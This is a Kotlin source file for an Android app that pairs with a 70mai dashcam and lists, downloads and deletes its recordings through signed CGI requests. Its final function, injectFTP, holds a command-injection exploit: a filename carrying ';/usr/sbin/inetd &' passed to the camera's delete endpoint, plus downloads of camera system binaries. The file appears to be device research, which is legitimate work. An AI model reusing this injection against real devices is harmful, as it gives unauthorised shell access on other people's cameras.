package com.lz1bgb.camhttp

import android.content.Context
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import java.io.File
//import java.net.HttpURLConnection
//import java.net.URL
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.IOException
import android.util.Log
import java.math.BigInteger
import java.security.MessageDigest
import java.io.FileOutputStream
//import java.io.OutputStream
import androidx.core.content.edit
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import java.net.Inet4Address
import android.os.Build
import java.util.Locale

/**
 * @brief Data class representing file information returned by the camera.
 */
@Serializable
data class FileInfo(
    val path: String,   /**< Remote directory path on the camera */
    val name: String,   /**< Filename with extension */
    val size: String,   /**< File size in bytes (as string) */
    val type: String,   /**< File category type */
)

/**
 * @brief Data class for parsing the camera's JSON API responses.
 */
@Serializable
data class ApiResponse(
    @SerialName("ResultCode")
    val resultCode: kotlinx.serialization.json.JsonElement, /**< Response status code (0 for success) */
    @SerialName("Result")
    val result: List<FileInfo> = emptyList(),               /**< List of files returned by the query */
)

/**
 * @brief Main HTTP client for interacting with the 70mai dashcam.
 * 
 * Handles network binding, authentication tokens, file listing, downloading, and remote deletion.
 */
class HttpClient(context: Context) {

    /** 
     * @brief Application context to avoid memory leaks.
     */
    val appContext: Context = context.applicationContext

    /**
     * @brief Current local IPv4 address of the phone.
     */
    var currentIpAddress: String? = null
        private set

    /**
     * @brief IP address of the DHCP server (camera gateway).
     */
    var dhcpServerIpAddress: String? = null
        private set

    /**
     * @brief Reusable OkHttpClient instance with infinite timeouts for large file transfers.
     */
    private var client = OkHttpClient.Builder()
        .connectTimeout(0, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(0, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(0, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private var cameraClient: OkHttpClient? = null
    private var cameraNetwork: Network? = null
    private val json = Json { ignoreUnknownKeys = true }

    /**
     * @brief Persisted session token obtained after pairing.
     */
    var sessionToken: String?
        get() {
            val prefs = appContext?.getSharedPreferences("CamSettings", Context.MODE_PRIVATE)
            return prefs?.getString("SESSION_TOKEN", null)
        }
        set(value) {
            val prefs = appContext?.getSharedPreferences("CamSettings", Context.MODE_PRIVATE)
            prefs?.edit {
                putString("SESSION_TOKEN", value)
            }
        }

    /**
     * @brief Gets the target camera IP from user settings.
     * @return Configured IP or default 192.168.0.1.
     */
    val cameraIp: String
        get() {
            val prefs = appContext?.getSharedPreferences("FtpSettings", Context.MODE_PRIVATE)
            return prefs?.getString("IP_CAM", "192.168.0.1") ?: "192.168.0.1"
        }

    /**
     * @brief Calculates MD5 hash of a string.
     * @param input String to hash.
     * @return 32-character hex string.
     */
    fun calculateMD5(input: String): String {
        val md = MessageDigest.getInstance("MD5")
        val digest = md.digest(input.toByteArray())
        return BigInteger(1, digest).toString(16).padStart(32, '0')
    }

    /**
     * @brief Generates the security signkey for 70mai requests.
     * @param urlQuery The query part of the URL.
     * @param token Active session token.
     * @return MD5 signature.
     */
    fun generateSignKey(urlQuery: String, token: String): String {
        return calculateMD5(urlQuery + token)
    }

    /**
     * @brief Scans available networks and binds to the camera's Wi-Fi.
     * 
     * Forces network traffic through the Wi-Fi interface if the camera gateway is detected,
     * allowing simultaneous Wi-Fi and mobile data usage.
     */
    fun updateNetworkInfo() {
        val connectivityManager =
            appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val wifiManager =
            appContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        // Find all available networks.
        @Suppress("DEPRECATION")
        val networks = connectivityManager.allNetworks
        var foundCameraNetwork: Network? = null

        for (network in networks) {
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            val linkProperties = connectivityManager.getLinkProperties(network)

            // Search for Wi-Fi network whose DHCP server (Gateway) matches the camera IP
            if (capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
                // Support for different API levels
                val dhcpAddr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    linkProperties?.dhcpServerAddress?.hostAddress
                } else {
                    // Fallback for older versions
                    @Suppress("DEPRECATION")
                    val gateway = wifiManager.dhcpInfo.gateway
                    String.format(
                        Locale.US,
                        "%d.%d.%d.%d",
                        gateway and 0xff,
                        gateway shr 8 and 0xff,
                        gateway shr 16 and 0xff,
                        gateway shr 24 and 0xff,
                    )
                }

                if (dhcpAddr == cameraIp) {
                    foundCameraNetwork = network
                    this.dhcpServerIpAddress = dhcpAddr

                    val ipv4Address = linkProperties?.linkAddresses?.find {
                        it.address is Inet4Address
                    }?.address?.hostAddress
                    this.currentIpAddress = ipv4Address
                    break
                }
            }
        }

        if (foundCameraNetwork != null) {
            if (this.cameraNetwork != foundCameraNetwork) {
                this.cameraNetwork = foundCameraNetwork
                // Create OkHttpClient bound directly to this network
                this.cameraClient = client.newBuilder()
                    .socketFactory(foundCameraNetwork.socketFactory)
                    .build()
                FileLogger.logToFile(appContext, "HttpClient", "Bound to camera Wi-Fi network.")
            }
        } else {
            this.cameraNetwork = null
            this.cameraClient = null
            FileLogger.logToFile(appContext, "HttpClient", "Camera network not detected.")
            
            // If not on camera network, update default active network info
            val activeNetwork = connectivityManager.activeNetwork
            val activeLP = connectivityManager.getLinkProperties(activeNetwork)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                this.dhcpServerIpAddress = activeLP?.dhcpServerAddress?.hostAddress
            } else {
                @Suppress("DEPRECATION")
                val gateway = wifiManager.dhcpInfo.gateway
                this.dhcpServerIpAddress = String.format(
                    Locale.US,
                    "%d.%d.%d.%d",
                    gateway and 0xff,
                    gateway shr 8 and 0xff,
                    gateway shr 16 and 0xff,
                    gateway shr 24 and 0xff,
                )
            }
            this.currentIpAddress = activeLP?.linkAddresses?.find { it.address is Inet4Address }?.address?.hostAddress
        }
    }

    /**
     * @brief Executes a GET request with smart network routing.
     * @param url Full target URL.
     * @return Response body as string or null on failure.
     */
    suspend fun executeRequest(url: String): String? {
        return withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder().url(url).build()
                
                // Use cameraClient for requests to camera address
                val activeClient = if (url.contains(cameraIp) && cameraClient != null) {
                    cameraClient!!
                } else {
                    client
                }

                val response = activeClient.newCall(request).execute()

                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    response.close()
                    responseBody
                } else {
                    FileLogger.logToFile(appContext, "HttpClient", "Request failed (${response.code}): $url")
                    response.close()
                    null
                }
            } catch (e: IOException) {
                FileLogger.logToFile(appContext, "HttpClient", "Execute request IOException: ${e.message}")
                e.printStackTrace()
                null
            }
        }
    }

    /**
     * @brief Downloads a file from the camera and saves it locally.
     * @param url Source URL.
     * @param destinationFolderPath Local directory to save the file.
     * @param onProgress Lambda for tracking bytes downloaded.
     * @return true if download succeeded and file is saved.
     */
    suspend fun downloadFile(url: String, destinationFolderPath: String, onProgress: ((Long, Long) -> Unit)? = null): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                FileLogger.logToFile(appContext, "HttpClient", "Attempting URL: $url")
                FileLogger.logToFile(appContext, "HttpClient", "Target path: $destinationFolderPath")

                val fileName = url.substringAfterLast('/').substringBefore('?')
                if (fileName.isEmpty()) return@withContext false

                val folder = File(destinationFolderPath)
                if (!folder.exists() && !folder.mkdirs()) return@withContext false

                val destinationFile = File(folder, fileName)

                val request = Request.Builder().url(url).build()
                FileLogger.logToFile(appContext, "HttpClient", "Downloading from URL: $url")
                
                // Use cameraClient for downloads from camera
                val activeClient = if (url.contains(cameraIp) && cameraClient != null) {
                    cameraClient!!
                } else {
                    client
                }
                
                val response = activeClient.newCall(request).execute()

                if (!response.isSuccessful) {
                    FileLogger.logToFile(appContext, "HttpClient", "File download failed: ${response.code}")
                    response.close() // Close on error
                    return@withContext false
                }

                val body = response.body
                if (body == null) {
                    FileLogger.logToFile(appContext, "HttpClient", "Empty response body")
                    response.close() // Close
                    return@withContext false
                }

                val totalBytes = body.contentLength()
                var bytesDownloaded = 0L

                // 5. Saving file to disk
                // .use automatically closes body (which also closes response)
                body.use { responseBody ->
                    responseBody.byteStream().use { inputStream ->
                        FileOutputStream(destinationFile).use { outputStream ->
                            val buffer = ByteArray(65536) // Increased buffer (64KB) for stable transfer
                            var bytesRead: Int
                            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                                outputStream.write(buffer, 0, bytesRead)
                                bytesDownloaded += bytesRead
                                onProgress?.invoke(bytesDownloaded, totalBytes)
                            }
                        }
                    }
                }

                return@withContext true // Success!

            } catch (e: IOException) {
                FileLogger.logToFile(appContext, "HttpClient", "Download file IOException: ${e.message}")
                e.printStackTrace()
                return@withContext false
            } catch (e: SecurityException) {
                // We may not have write permissions for this folder
                FileLogger.logToFile(appContext, "HttpClient", "Download file SecurityException: ${e.message}")
                e.printStackTrace()
                return@withContext false
            }
        }
    }

    /**
     * @brief Toggles Album Access Mode on the camera.
     * @param enable true to enable access (stop recording), false to resume recording.
     * @return true on camera confirmation.
     */
    suspend fun setAlbumMode(enable: Boolean): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                updateNetworkInfo() // Ensure we are on the correct network
                val dhcp = dhcpServerIpAddress ?: cameraIp
                val token = sessionToken ?: return@withContext false
                val timestamp = System.currentTimeMillis() / 1000L
                // Inverse logic according to requirement: 
                // enable=0 to enable access (album), enable=1 for recording
                val enableValue = if (enable) 0 else 1
                
                val queryPath = "setaccessalbum.cgi?"
                val queryParams = "&-enable=$enableValue&-timestamp=$timestamp"
                val sign = generateSignKey(queryPath + queryParams, token)
                
                val url = "http://$dhcp/cgi-bin/$queryPath$queryParams&-signkey=$sign"
                val response = executeRequest(url)
                
                FileLogger.logToFile(appContext, "HttpClient", "Set album mode response: $response")
                // Camera returns ResultCode 0 on success
                response?.contains("\"ResultCode\":0") == true || response?.contains("\"ResultCode\":\"0\"") == true
            } catch (e: Exception) {
                FileLogger.logToFile(appContext, "HttpClient", "Delete remote file error: ${e.message}")
                e.printStackTrace()
                false
            }
        }
    }

    /**
     * @brief Registers the phone as an active client with the camera (Keep-alive).
     * @return true if registration succeeded.
     */
    suspend fun registerClient(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val dhcp = dhcpServerIpAddress ?: cameraIp
                val ip = currentIpAddress ?: return@withContext false
                val token = sessionToken ?: return@withContext false
                val timestamp = System.currentTimeMillis() / 1000L
                
                val queryPath = "client.cgi?"
                val queryParams = "&-operation=register&-ip=$ip&-timestamp=$timestamp"
                val sign = generateSignKey(queryPath + queryParams, token)
                
                val url = "http://$dhcp/cgi-bin/$queryPath$queryParams&-signkey=$sign"
                val response = executeRequest(url)
                
                Log.d("HttpClient", "Register client response: $response")
                response?.contains("success") == true || response?.contains("\"ResultCode\":0") == true || response?.contains("\"ResultCode\":\"0\"") == true
            } catch (e: Exception) {
                FileLogger.logToFile(appContext, "HttpClient", "Delete remote file error: ${e.message}")
                e.printStackTrace()
                false
            }
        }
    }

    /**
     * @brief Fetches all files of a specific type from the camera sdcard.
     * 
     * Handles pagination automatically to retrieve the complete list.
     * @param type File category type (0-15).
     * @return List of FileInfo or null on error.
     */
    suspend fun getFileList(type: Int): List<FileInfo>? {
        return withContext(Dispatchers.IO) {
            try {
                val dhcp = dhcpServerIpAddress ?: cameraIp
                val token = sessionToken ?: return@withContext null
                val allFiles = mutableListOf<FileInfo>()
                var startIndex = 0
                val pageSize = 100
                
                while (true) {
                    val timestamp = System.currentTimeMillis() / 1000L
                    val queryPath = "getfilelist.cgi?"
                    val queryParams = "&-start=$startIndex&-end=${startIndex + pageSize - 1}&-type=$type&-timestamp=$timestamp"
                    val sign = generateSignKey(queryPath + queryParams, token)
                    
                    val url = "http://$dhcp/cgi-bin/$queryPath$queryParams&-signkey=$sign"
                    FileLogger.logToFile(appContext, "HttpClient", "Fetching file list: $url")
                    val responseJson = executeRequest(url) ?: break

                    val apiResponse = json.decodeFromString<ApiResponse>(responseJson)
                    val code = apiResponse.resultCode.toString().replace("\"", "")
                    if (code == "0") {
                        val batch = apiResponse.result
                        if (batch.isEmpty()) break
                        
                        allFiles.addAll(batch)
                        
                        // If we received fewer than requested, it means there are no more
                        if (batch.size < pageSize) break
                        
                        startIndex += pageSize
                    } else {
                        break
                    }
                }
                
                if (allFiles.isNotEmpty()) allFiles else null
            } catch (e: Exception) {
                FileLogger.logToFile(appContext, "HttpClient", "Get file list error: ${e.message}")
                e.printStackTrace()
                null
            }
        }
    }

    /**
     * @brief Deletes a file from the camera's storage.
     * @param path Remote directory path.
     * @param name Remote filename.
     * @param token Active session token.
     * @return true on success confirmation.
     */
    suspend fun deleteRemoteFile(path: String, name: String, token: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val dhcp = dhcpServerIpAddress ?: cameraIp
                val timestamp = System.currentTimeMillis() / 1000L
                
                // Form the URL_Query for deletion according to the specification
                val queryPath = "delete.cgi?"
                val queryParams = "&-path=$path&-name=$name&-timestamp=$timestamp"
                
                // Generate the signkey: MD5(URI + Params + Token)
                val sign = generateSignKey(queryPath + queryParams, token)
                
                val url = "http://$dhcp/cgi-bin/$queryPath$queryParams&-signkey=$sign"
                val responseJson = executeRequest(url)

                responseJson != null && responseJson.contains("\"ResultCode\":\"0\"")
            } catch (e: Exception) {
                FileLogger.logToFile(appContext, "HttpClient", "Update FW error: ${e.message}")
                e.printStackTrace()
                false
            }
        }
    }

    /**
     * @brief Orchestrates downloading a file and deleting it only if saved correctly.
     */
//    suspend fun downloadAndDeleteFile(
//        downloadUrl: String,
//        remotePath: String,
//        remoteName: String,
//        destinationFolderPath: String,
//        token: String
//    ): Boolean {
//        val success = downloadFile(downloadUrl, destinationFolderPath)
//        if (success) {
//            println("Download success. Executing deletion...")
//            return deleteRemoteFile(remotePath, remoteName, token)
//        }
//        return false
//    }

    /**
     * @brief Quick check if connected to camera Wi-Fi.
     */
//    fun checkAuthentication(): Boolean {
//        updateNetworkInfo()
//        return dhcpServerIpAddress == cameraIp
//    }

    /**
     * @brief Sends a configuration request to complete an OTA firmware update process.
     */
    suspend fun updateFW(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                updateNetworkInfo()
                val dhcp = dhcpServerIpAddress ?: cameraIp
                val token = sessionToken ?: return@withContext false
                val timestamp = System.currentTimeMillis()
                
                val queryPath = "Config.cgi?"
                val queryParams = "action=set&property=ApkOtaFwComplete&value=1&timestamp=$timestamp"
                val sign = generateSignKey(queryPath + queryParams, token)
                
                val url = "http://$dhcp/cgi-bin/$queryPath$queryParams&signkey=$sign"
                val response = executeRequest(url)
                
                FileLogger.logToFile(appContext!!, "HttpClient", "Update FW response: $response")
                response?.contains("\"ResultCode\":0") == true || response?.contains("\"ResultCode\":\"0\"") == true
            } catch (e: Exception) {
                FileLogger.logToFile(appContext, "HttpClient", "Update FW error: ${e.message}")
                e.printStackTrace()
                false
            }
        }
    }

    /**
     * @brief Placeholder for future maintenance/exploit testing functions.
     */
    suspend fun injectFTP(): Boolean {
        updateFW()
        downloadFile("http://$cameraIp/usr/bin/log/syslog_file",
            "/storage/emulated/0/Android/data/com.lz1bgb.camhttp/files")
        downloadFile("http://$cameraIp/usr/bin/ota_run",
            "/storage/emulated/0/Android/data/com.lz1bgb.camhttp/files")

        val token = sessionToken ?: return false
        return deleteRemoteFile("/mnt/sd/Parking/Front", "LOG.MP4;/usr/sbin/inetd%20%26", token)
    }
}
